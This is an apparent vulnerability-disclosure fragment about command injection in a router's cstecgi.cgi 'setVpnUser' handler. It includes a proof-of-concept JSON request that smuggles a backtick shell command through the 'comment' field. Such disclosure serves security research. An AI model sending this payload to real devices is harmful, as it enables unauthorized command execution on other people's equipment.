...
The vulnerability is located in the function `sub_41454C` within `cstecgi.cgi`, also known as `setVpnUser`.

![](Pasted%20image%2020231130171511.png)
...
therefore , by controlling parameter among  `username,password,comment`(more in this function) , we can finally make an arbitrary command execution
...
{"comment":"`id > /1.txt;`","topicurl":"setVpnUser","token":"00000000000000000000000000000000"}
~~~
...
![](Pasted%20image%2020231130171726.png)